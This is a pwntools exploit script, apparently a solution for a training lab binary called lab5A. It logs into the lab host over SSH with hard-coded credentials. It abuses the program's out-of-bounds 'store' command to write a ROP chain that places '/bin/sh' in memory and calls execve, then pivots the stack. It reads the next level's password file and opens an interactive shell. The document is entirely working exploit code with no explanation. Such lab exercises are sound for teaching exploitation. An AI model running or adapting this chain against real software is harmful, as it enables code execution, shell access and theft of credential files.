from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab5A', password = 'th4ts_th3_r0p_i_lik3_2_s33')
r = s.process(b"/levels/lab05/lab5A")

def store(idx, num):
        r.recv()
        r.sendline(b'store')
        sleep(1)
        r.sendlineafter(b'Number: ', str(num).encode())
        sleep(1)
        r.sendlineafter(b'Index: ', str(idx).encode())

context.log_level = 'debug'

bss = 0x080ebf80
add_esp_0x20_pop3 = 0x08051994 # add esp, 0x20 ; pop ebx ; pop esi ; pop edi ; ret 
int_0x80 = 0x08048eaa
pop_edi = 0x0804846f
mov_eax_ecx = 0x080b636a
pop_ecx_ebx = 0x0806f3d1 # pop ecx ; pop ebx ; ret
mov =  0x080543d2 # mov dword ptr [eax + 0x24], ecx ; ret
mov_edx_m1 = 0x08054cc5 # mov edx, 0xffffffff ; ret
inc_edx_pop_es = 0x08067b99 # inc edx ; pop es ; ret
pop_ebx_esi = 0x08049df4 # pop ebx ; pop esi ; ret

i = 1
store(i, pop_ecx_ebx)
store(i + 1, bss)
i += 3
store(i, mov_eax_ecx) # eax = bss
store(i + 1, pop_edi)
i += 3
store(i, pop_ecx_ebx)
store(i + 1, u32(b'/bin'))
i += 3

store(i, mov)
store(i + 1, pop_edi)
i += 3
store(i, pop_ecx_ebx)
store(i + 1, bss + 4)
i += 3
store(i, mov_eax_ecx)
store(i + 1, pop_edi)
i += 3
store(i, pop_ecx_ebx)
store(i + 1, u32(b'/sh\x00'))
i += 3
store(i, mov) # store /bin/sh in [bss + 0x24]
store(i + 1, pop_edi)
i += 3

store(i, mov_edx_m1)
store(i + 1, inc_edx_pop_es) # set edx to 0
i += 3
store(i, pop_ecx_ebx)
store(i + 1, 11)
i += 3
store(i, mov_eax_ecx) # set eax to 11 
store(i + 1, pop_edi)
i += 3
store(i, pop_ecx_ebx) # set ecx to 0
store(i + 1, 0)
i += 3
store(i, pop_ebx_esi)
store(i + 1, bss + 0x24) # store bss + 0x24 in ebx, which is the pointer of /bin/sh
i += 3
store(i, int_0x80) # execve("/bin/sh", 0, 0)
store(-11, add_esp_0x20_pop3)
r.sendline(b'cat /home/lab5end/.pass')
r.interactive()
